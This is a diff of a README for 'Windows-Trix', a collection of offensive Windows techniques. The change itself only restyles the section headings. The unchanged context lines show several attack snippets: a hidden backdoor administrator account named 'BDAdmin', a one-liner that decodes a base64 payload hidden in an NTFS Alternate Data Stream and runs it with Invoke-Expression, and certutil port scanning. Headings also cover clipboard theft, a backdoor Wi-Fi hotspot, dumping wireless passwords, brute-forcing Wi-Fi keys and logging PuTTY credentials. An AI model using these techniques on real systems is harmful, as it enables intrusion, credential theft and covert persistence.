@@ -1,7 +1,7 @@
 # Windows-Trix
 An assortment of techniques that can be used to exploit Windows.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.
 
-## Copying data from the clipboard using powershell
+## >> Copying data from the clipboard using powershell
 
 ```powershell
 Add-Type -AssemblyName System.Windows.Forms
@@ -27,7 +27,7 @@ else
 }
 ```
 
-## Configuring a backdoor hotspot using powershell
+## >> Configuring a backdoor hotspot using powershell
 
 **Activation script** `wifi-start.ps1`<br />
 ```powershell
@@ -238,7 +238,7 @@ else
 }
 ```
 
-## Retrieving wireless profile passwords using powershell
+## >> Retrieving wireless profile passwords using powershell
 
 ```powershell
 $wp = @()
@@ -262,11 +262,11 @@ $wp.foreach({
 })})
 ```
 
-## View wireless networks and signal strength using netsh
+## >> View wireless networks and signal strength using netsh
 
 ```netsh wlan show networks mode=bssid```
 
-## Slow on-line brute-force wireless password using powershell
+## >> Slow on-line brute-force wireless password using powershell
 
 ```powershell
 $ssid = "iPhone"
@@ -350,7 +350,7 @@ foreach($key in $wordlist)
 }
 ```
 
-## Logging PuTTY credentials using powershell
+## >> Logging PuTTY credentials using powershell
 
 ```powershell
 $user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
@@ -460,7 +460,7 @@ else
 }
 ```
 
-## Hiding payloads in Alternate Data Streams (ADS)
+## >> Hiding payloads in Alternate Data Streams (ADS)
 
 **Create a container file on an NTFS file system**<br />
 `echo This is a harmless text file :) > c:\windows\temp\harmless.txt`
@@ -495,7 +495,7 @@ Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
 powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
 ```
 
-## TCP port scanning using certutil
+## >> TCP port scanning using certutil
 
 This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
 The target being scanned in this example is 10.1.2.3 port 8080.
@@ -506,7 +506,7 @@ Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not 
 Response `0x80072efd` the port did not respond.<br />
 Response does not contain an error code, then the file was retrieved successfully.
 
-## Using netsh to capture network packets
+## >> Using netsh to capture network packets
 
 This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
 This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.
